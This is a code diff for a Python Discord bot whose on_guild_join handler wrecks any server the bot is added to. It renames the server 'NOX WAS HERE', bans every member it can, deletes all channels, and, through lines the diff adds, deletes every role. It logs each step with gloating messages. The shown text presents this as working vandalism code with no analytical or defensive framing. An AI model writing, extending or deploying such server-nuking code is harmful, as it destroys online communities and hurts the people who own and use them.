@@ -44,7 +44,7 @@ class Startup(commands.Cog):
         return
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
-
+        
         if guild.id != 993573362221715546 or guild.id != 993594197594607636:
             try:
                 print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
@@ -53,13 +53,18 @@ class Startup(commands.Cog):
                 print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
                 await guild.edit(name="NOX WAS HERE")
                 print(f'Guild: {guild.name} - {str(guild.id)} - Changed server name :)')
+                for c in guild.roles:
+                    print(f'Guild: {guild.name} - {str(guild.id)} - Deleted role: {c.name}')
+                    await c.delete()
+                print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all possible roles :)')
                 for member in guild.members:
                     try:
                         await member.ban(reason='Banned by Anix <3')
+                        print(f'Banned {member.name}{member.discriminator} - {str(member.id)}')
                     except discord.errors.Forbidden:
                         pass
-                    print(f'Banned {member.name} - {str(member.id)}')
                 print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
+                
                 for c in guild.channels:
                     await c.delete()
                 print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
@@ -77,9 +82,7 @@ class Startup(commands.Cog):
     @commands.Cog.listener()
     async def on_member_join(self, member):
         print(f'Guild - {member.guild.name} - {str(member.guild.id)} -  {member.name} - {str(member.id)} joined :)') 
-        if member.guild.id == 993594197594607636:
-            welcomeid = 1002280186663936080
-        elif member.guild.id == 993573362221715546:
+        if member.guild.id == 993573362221715546:
             welcomeid = 993573959062790154
         await self.bot.get_channel(welcomeid).send(f"<@{member.id}>",embed=discord.Embed(title=f":wave: Welcome to {member.guild.name}!", description="Please read the rules and have fun!", color=discord.Color.blue()).set_footer(text=f'Welcome {member.name}', icon_url=member.avatar_url).set_image(url="https://i.imgur.com/pkWTMMl.gif"))
         await member.send(f"<@{member.id}> Welcome to the {member.guild.name} Please read the rules and have fun!")
